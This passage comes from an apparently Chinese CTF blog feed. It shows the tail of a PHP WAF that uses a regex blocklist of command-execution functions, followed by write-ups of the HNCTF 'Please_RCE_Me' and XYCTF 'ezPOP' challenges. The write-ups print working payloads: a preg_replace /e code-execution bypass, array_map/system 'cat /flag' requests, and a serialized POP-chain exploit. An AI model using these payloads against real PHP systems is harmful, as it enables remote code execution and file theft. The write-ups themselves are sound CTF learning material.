class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>))&#123; <br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(|file_put_contents|fwrite|curl|system|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restorei/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">简单将易出现问题的字符替换成中文</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http的请求包，意义在于获取别人的攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raws</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>; <br>     <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>); <br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>); <br>            <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\r\n&quot;</span>; <br>        &#125; <br>    &#125; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>; <br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这里拦截并记录攻击payload      第一个参数为记录类型   第二个参数是日志内容   使用时直接调用函数</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- [&quot;</span>.<span class="hljs-variable">$alert</span>.<span class="hljs-string">&quot;]&quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_http_raws</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;attack_detected_log.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;CTF&#123;H4Ck_IS_s0_c001&#125;&quot;</span>; <span class="hljs-comment">//如果请求带有flag关键字，显示假的flag。（2333333）</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">//拦截前延时3秒</span><br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><br>&#125;<br><span class="hljs-variable">$waf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">waf</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hnctf</title>
    <link href="/2024/05/13/%E6%AF%94%E8%B5%9B/hnctf/"/>
    <url>/2024/05/13/%E6%AF%94%E8%B5%9B/hnctf/</url>
    
    <content type="html"><![CDATA[<h3 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-keyword">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || preg_match(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span><br></code></pre></td></tr></table></figure><p>使用大小写绕过</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_replace(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,$<span class="hljs-params">_POST</span>[&#x27;<span class="hljs-params">task</span>&#x27;],$<span class="hljs-params">_POST</span>[&#x27;<span class="hljs-params">flag</span>&#x27;])</span>;<br></code></pre></td></tr></table></figure><p>preg_replace() &#x2F;e代码执行漏洞</p><p>过滤了很多，尝试无参RCE</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">strrev</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">array</span>())))))));<span class="hljs-comment">//查看根目录文件</span></span><br></code></pre></td></tr></table></figure><p>找到flag文件</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">task</span>=show_source(session_id(session_start()));<br>&amp;<span class="hljs-attribute">flag</span>=Please_give_me_flag<br><br>Cookie: <span class="hljs-attribute">PHPSESSID</span>=/flag<br></code></pre></td></tr></table></figure><p>另外几种RCE方式</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">task</span>=array_map($_POST[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])&amp;<span class="hljs-attribute">a</span>=system&amp;b[]=cat /flag&amp;<span class="hljs-attribute">flag</span>=Please_give_me_flag<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>hnctf.yuanshen.life:<span class="hljs-number">33183</span><span class="hljs-regexp">/?moran=flag&amp;1=/</span>flag<br><br>task=print(file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]));&amp;flag=please_give_me_flAg<br></code></pre></td></tr></table></figure><p>学到的新姿势</p><p>查阅可以进行RCE的函数，发现还有一个array_map()可以使用</p><p>array_map()需传入两个参数，第一个参数为使用的函数，第二个参数为一个数组，并且数组的数据为函数的参数</p><p>arr &#x3D; array(‘phpinfo()’);</p><p>array_map(‘assert’,arr);就可以执行phpinfo()</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xyctf</title>
    <link href="/2024/04/25/%E6%AF%94%E8%B5%9B/xyctf/"/>
    <url>/2024/04/25/%E6%AF%94%E8%B5%9B/xyctf/</url>
    
    <content type="html"><![CDATA[<h3 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 A &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 B &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-variable">$d</span>=<span class="hljs-variable language_">$this</span>-&gt;d;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)(<span class="hljs-variable">$c</span>)(<span class="hljs-variable">$d</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 C &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;noooooob!!!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化题目</p><p>尝试构造pop链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">__<span class="hljs-function"><span class="hljs-title">get</span> --&gt;</span> __<span class="hljs-function"><span class="hljs-title">toString</span> --&gt;</span> __destruct<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$num1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>(); <span class="hljs-comment">//__toString</span><br><span class="hljs-variable">$num2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>(); <span class="hljs-comment">//__get</span><br><span class="hljs-variable">$num3</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>(); <span class="hljs-comment">//__destruct</span><br><span class="hljs-variable">$num2</span>-&gt;c=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$num2</span>-&gt;d=<span class="hljs-string">&quot;cat /f*&quot;</span>;<br><span class="hljs-variable">$num1</span>-&gt;a=<span class="hljs-string">&quot;asd&quot;</span>;<br><span class="hljs-variable">$num1</span>-&gt;s=<span class="hljs-variable">$num2</span>;<br><span class="hljs-variable">$num3</span>-&gt;c=<span class="hljs-variable">$num1</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$num3</span>,<span class="hljs-literal">null</span>));<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;CCC&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;AAA&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BBB&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;d&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p><code>throw new Exception(&quot;noooooob!!!&quot;);</code>在程序结束之前抛出异常，然后退出，这样反序列化的类就不能正确触发destruct函数了</p><p>法1：Fast-destruct即可:删除末尾的 } 快速触发 __destruct() (垃圾回收机制)从而绕过抛出异常终止执行</p><p>法2：这里使用unset()函数的原理绕过，这个函数相当于将类回收。可以使用数组反序列化的方式实现unset的功能，将0号元素设置为要反序列化的类，然后将后面的1号元素设置为null，并将位置1改为位置0。如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;CCC&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;AAA&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BBB&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;d&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>法1：然后再利用一个PHP原生类构成完整payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /?xy=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;CCC&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;AAA&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BBB&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;d&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br><br><span class="hljs-attribute">a</span>=Closure::fromCallable&amp;<span class="hljs-number">0</span>=Closure&amp;<span class="hljs-number">1</span>=fromCallable<br></code></pre></td></tr></table></figure><p>利用 PHP原生类静态方法Closure::fromCallable，然后再以数组作为参数二次调用，这样经过</p><p>call_user_func($a, $b) 以后，就形成了一个Closure ,它加载第一个参数（$c），就变成了以那个参</p><p>数命名的函数，例如system。然后再加载第二个参数（$d）就变成了system函数的参数。</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404252208806.png" alt="image-20240425215720881"></p><p>法2：</p><p>在PHP&gt;7后，支持 (‘system’)(‘ls’) 这种&#x3D;&#x3D;动态执行函数&#x3D;&#x3D;的特性</p><p>简单测测 任意闭包会影响结果吗?</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405062138188.png" alt="image-20240506213819040"></p><p>(‘system’)(‘ls’)(‘J1rrY’)(668)(996); 任意闭包都不会影响我们的结果 那么我们现在的问题是如何让 call_user_func($a,[‘key’&#x3D;&gt;’value’]) 返回字符串而且回调函数接受 一个数组，我们自然而然想到 implode 函数，将数组的值拼接为一个字符串，非常符合我们的预期 简单测试一下</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405062139631.png" alt="image-20240506213901559"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$num1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>(); <span class="hljs-comment">//__toString</span><br><span class="hljs-variable">$num2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>(); <span class="hljs-comment">//__get</span><br><span class="hljs-variable">$num3</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>(); <span class="hljs-comment">//__destruct</span><br><span class="hljs-variable">$num2</span>-&gt;c=<span class="hljs-string">&quot;cat /f*&quot;</span>;<br><span class="hljs-variable">$num2</span>-&gt;d=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$num1</span>-&gt;a=<span class="hljs-string">&quot;asd&quot;</span>;<br><span class="hljs-variable">$num1</span>-&gt;s=<span class="hljs-variable">$num2</span>;<br><span class="hljs-variable">$num3</span>-&gt;c=<span class="hljs-variable">$num1</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$num3</span>);<br><br>POST<br>a=implode&amp;b=system<br></code></pre></td></tr></table></figure><h3 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Kobe</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) &gt; <span class="hljs-number">13</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;see you again~&quot;</span>);<br>    &#125;<br>    <span 